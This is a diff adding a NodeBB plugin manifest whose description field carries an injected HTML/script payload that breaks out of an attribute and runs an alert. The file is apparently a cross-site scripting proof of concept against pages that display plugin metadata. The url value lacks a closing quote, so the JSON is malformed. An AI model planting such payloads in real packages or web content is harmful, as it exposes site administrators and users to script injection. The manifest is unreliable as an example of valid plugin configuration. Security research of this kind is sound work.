@@ -1,0 +1,6 @@
+{
+    "id": "nodebb-plugin",
+    "description": "A nodebb plugin\"><script>alert(0x40)</script>",
+    "url": "https://github.com/numanturle/nodebb-plugin,
+    "library": "./index.js"
+}
